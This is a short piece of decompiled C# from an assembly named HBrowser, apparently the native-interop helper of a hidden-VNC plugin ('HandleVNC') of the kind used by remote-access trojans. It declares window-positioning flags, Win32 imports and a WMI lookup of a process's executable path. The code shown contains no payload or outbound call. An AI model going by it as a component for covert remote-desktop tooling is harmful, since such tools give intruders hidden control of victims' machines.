// HBrowser, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Plugin.HandleVNC.Native
using System;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;

public static class Native
{
	[Flags]
	public enum SetWindowPosFlags : uint
	{
		AsynchronousWindowPosition = 0x4000u,
		DeferErase = 0x2000u,
		DrawFrame = 0x20u,
		FrameChanged = 0x20u,
		HideWindow = 0x80u,
		DoNotActivate = 0x10u,
		DoNotCopyBits = 0x100u,
		IgnoreMove = 2u,
		DoNotChangeOwnerZOrder = 0x200u,
		DoNotRedraw = 8u,
		DoNotReposition = 0x200u,
		DoNotSendChangingEvent = 0x400u,
		IgnoreResize = 1u,
		IgnoreZOrder = 4u,
		ShowWindow = 0x40u
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, SetWindowPosFlags uFlags);

	[DllImport("user32")]
	public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);

	public static string GetMainModuleFilepath(int id)
	{
		string queryString = "SELECT ProcessId, ExecutablePath FROM Win32_Process WHERE ProcessId = " + id;
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
		{
			ManagementObjectCollection source = managementObjectSearcher.Get();
			ManagementObject managementObject = source.Cast<ManagementObject>().FirstOrDefault();
			if (managementObject != null)
			{
				return Convert.ToString(managementObject["ExecutablePath"]);
			}
		}
		return null;
	}
}
